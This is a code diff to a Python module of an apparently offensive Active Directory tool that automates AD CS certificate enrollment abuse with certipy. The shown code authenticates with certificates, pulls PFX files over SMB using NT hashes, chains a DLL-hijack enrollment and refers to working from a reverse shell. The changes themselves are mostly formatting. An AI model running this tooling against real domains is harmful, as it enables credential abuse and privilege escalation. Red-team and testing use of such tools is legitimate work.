@@ -6,12 +6,12 @@ from pathlib import Path
 from typing import TYPE_CHECKING
 
 from admapper.adcs.analyze import get_adcs_finding
-from admapper.support.platform import resolve_certipy
 from admapper.adcs.enroll import build_local_enroll_powershell
-from admapper.support.output import print_info, print_success, print_warning
 from admapper.creds.common import pick_dc_ip
 from admapper.models.credential import Credential, CredentialType
 from admapper.postex.pe_arch import TargetArch
+from admapper.support.output import print_info, print_success, print_warning
+from admapper.support.platform import resolve_certipy
 
 if TYPE_CHECKING:
     from admapper.support.session import Session
@@ -91,7 +91,9 @@ def run_certipy_enrollment(
         cred = _pick_pivot_cred(session, principal)
 
     if cred is None:
-        ps = build_local_enroll_powershell(template=template, dns_name=dns, ca_host=dns, ca_name=ca_name)
+        ps = build_local_enroll_powershell(
+            template=template, dns_name=dns, ca_host=dns, ca_name=ca_name
+        )
         script_path = out_dir / f"enroll_{principal.replace('.', '_')}.ps1"
         script_path.write_text(ps + "\n", encoding="utf-8")
         print_warning(f"no credential for {principal} — use local enrollment on reverse shell")
@@ -182,7 +184,9 @@ def run_certipy_enrollment(
         dc_ip,
     ]
     print_info(f"certipy auth as {domain}\\{host_user}")
-    auth_proc = subprocess.run(auth_cmd, capture_output=True, text=True, timeout=120, cwd=str(out_dir))
+    auth_proc = subprocess.run(
+        auth_cmd, capture_output=True, text=True, timeout=120, cwd=str(out_dir)
+    )
     auth_out = (auth_proc.stdout or "") + (auth_proc.stderr or "")
     if auth_proc.returncode == 0:
         print_success("certificate authentication OK")
@@ -241,7 +245,7 @@ def fetch_pfx_via_smb(
         dns = resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or f"dc01.{domain}"
         remote_name = f"{dns}.pfx"
     local = out_dir / remote_name
-    drop = (drop_path or r"C:\ProgramData").lstrip(r"C:\").replace("\\", "/")
+    drop = (drop_path or r"C:\ProgramData").lstrip("C:\\").replace("\\", "/")
     remote = f"{drop}/{remote_name}"
 
     secret = cred.nthash if cred.uses_nthash else cred.password
@@ -348,7 +352,9 @@ def run_enroll_hijack(
     domain = session.workspace.domain
     if not domain:
         raise ValueError("no workspace domain")
-    resolved_dns = dns_name or resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or f"dc01.{domain}"
+    resolved_dns = (
+        dns_name or resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or f"dc01.{domain}"
+    )
 
     run_dll_hijack(
         session,
@@ -430,7 +436,9 @@ def run_enroll_hijack(
         dc_ip,
     ]
     print_info(f"certipy auth as {domain}\\{host_user}")
-    auth_proc = subprocess.run(auth_cmd, capture_output=True, text=True, timeout=120, cwd=str(pfx.parent))
+    auth_proc = subprocess.run(
+        auth_cmd, capture_output=True, text=True, timeout=120, cwd=str(pfx.parent)
+    )
     auth_out = (auth_proc.stdout or "") + (auth_proc.stderr or "")
     if auth_proc.returncode == 0:
         print_success("certificate authentication OK")
